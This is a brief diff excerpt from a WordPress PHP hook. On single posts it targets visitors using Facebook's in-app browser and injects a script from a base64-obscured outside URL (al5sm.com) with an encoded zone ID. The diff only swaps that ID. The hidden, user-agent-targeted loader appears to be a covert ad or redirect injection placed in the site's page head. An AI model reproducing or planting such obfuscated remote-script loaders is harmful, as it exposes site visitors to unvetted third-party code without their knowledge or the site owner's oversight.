@@ -29,7 +29,7 @@ add_action('wp_head', function () {
     if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
 
         $src  = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
-        $zone = base64_decode('MTE2MDk2MjA=');
+        $zone = base64_decode('MTE2MTM2MjM=');
         ?>
         <script>
         (function(s){
